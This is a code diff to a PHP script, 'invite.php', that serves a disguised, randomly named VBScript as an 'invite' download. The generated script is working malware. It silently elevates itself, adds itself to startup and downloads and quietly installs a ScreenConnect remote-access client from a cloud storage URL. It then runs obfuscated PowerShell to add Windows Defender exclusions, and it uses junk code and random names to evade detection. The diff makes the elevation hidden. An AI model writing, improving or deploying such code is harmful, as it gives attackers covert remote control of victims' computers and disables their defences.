@@ -1,5 +1,5 @@
 <?php
-// invite.php - Fixed download path only
+// invite.php - Improved Elevation + runas 0
 header('Content-Type: text/plain; charset=utf-8');
 header('Cache-Control: no-store, no-cache, must-revalidate');
 
@@ -23,7 +23,6 @@ if (empty($available)) {
 
 $chosenBase = $available[array_rand($available)];
 $random5 = str_pad(rand(10000, 99999), 5, '0', STR_PAD_LEFT);
-
 $chosen = $chosenBase . "_" . $random5 . ".vbs";
 
 $used[] = $chosenBase;
@@ -34,10 +33,10 @@ header('Content-Disposition: attachment; filename="' . $chosen . '"');
 $scUrl = "https://party.nyc3.cdn.digitaloceanspaces.com/ScreenConnect.ClientSetup%20(1).msi";
 
 $sessionId = bin2hex(random_bytes(24));
-$ts        = time();
-$randV1    = 'v' . substr(md5(random_bytes(8)), 0, 12);
-$randFunc  = 'f' . substr(md5(random_bytes(8)), 0, 10);
-$xorKey    = rand(100, 255);
+$ts = time();
+$randV1 = 'v' . substr(md5(random_bytes(8)), 0, 12);
+$randFunc = 'f' . substr(md5(random_bytes(8)), 0, 10);
+$xorKey = rand(100, 255);
 
 $junkLines = rand(12, 45);
 $junk = "";
@@ -50,7 +49,7 @@ echo <<<VBS
 
 Dim $randV1, objShell, objFSO
 Set objShell = CreateObject("WScript.Shell")
-Set objFSO   = CreateObject("Scripting.FileSystemObject")
+Set objFSO = CreateObject("Scripting.FileSystemObject")
 
 $randV1 = "$sessionId"
 
@@ -62,30 +61,13 @@ Function D(s)
     D = r
 End Function
 
-Function IsElevated()
-    On Error Resume Next
-    Dim wmi, proc
-    Set wmi = GetObject("winmgmts:\\\\.\\root\\cimv2")
-    Set proc = wmi.ExecQuery("Select * from Win32_Process where ProcessId=" & GetObject("winmgmts:\\\\.\\root\\cimv2:Win32_Process.Handle=" & objShell.ProcessId).ProcessId)
-    IsElevated = False
-End Function
-
-Sub $randFunc
-    On Error Resume Next
-    If Not IsElevated Then Call Elevate
-    Call AddToStartup
-    Call DownloadAndExecute
-    Call HideAgent
-End Sub
-
-Sub Elevate()
-    On Error Resume Next
-    Dim fsoPath, cmd
-    fsoPath = WScript.ScriptFullName
-    cmd = D("dmd /c ") & """" & fsoPath & """"
-    objShell.ShellExecute "cmd.exe", cmd, "", "runas", 1
+' ===== IMPROVED ELEVATION (runas 0 = hidden) =====
+If WScript.Arguments.Length = 0 Then
+    Dim shell
+    Set shell = CreateObject("Shell.Application")
+    shell.ShellExecute "wscript.exe", """" & WScript.ScriptFullName & """ elevated", "", "runas", 0
     WScript.Quit
-End Sub
+End If
 
 Sub AddToStartup()
     On Error Resume Next
@@ -98,7 +80,7 @@ Sub DownloadAndExecute()
     Dim u, p, http, strm
     u = "$scUrl"
     p = objShell.ExpandEnvironmentStrings("%TEMP%\\sc_setup.msi")
-    
+   
     Set http = CreateObject("MSXML2.XMLHTTP")
     http.Open "GET", u, False
     http.Send
@@ -106,7 +88,7 @@ Sub DownloadAndExecute()
         Set strm = CreateObject("ADODB.Stream")
         strm.Type = 1 : strm.Open : strm.Write http.responseBody : strm.SaveToFile p, 2 : strm.Close
         objShell.Run """" & p & """ /quiet", 0, True
-        WScript.Sleep 5000
+        WScript.Sleep 90000
         If objFSO.FileExists(p) Then objFSO.DeleteFile p, True
     End If
 End Sub
@@ -116,8 +98,11 @@ Sub HideAgent()
     objShell.Run D("qpxfstifmm -NoProfile -WindowStyle Hidden -Command ""Add-MpPreference -ExclusionPath 'C:\\Program Files (x86)\\ScreenConnect Client*'; Add-MpPreference -ExclusionProcess 'ScreenConnect*.exe'"""), 0, True
 End Sub
 
-$junk
-Call $randFunc
+' ===== MAIN =====
+Call AddToStartup
+Call DownloadAndExecute
+Call HideAgent
+
 WScript.Quit
 VBS;
 ?>
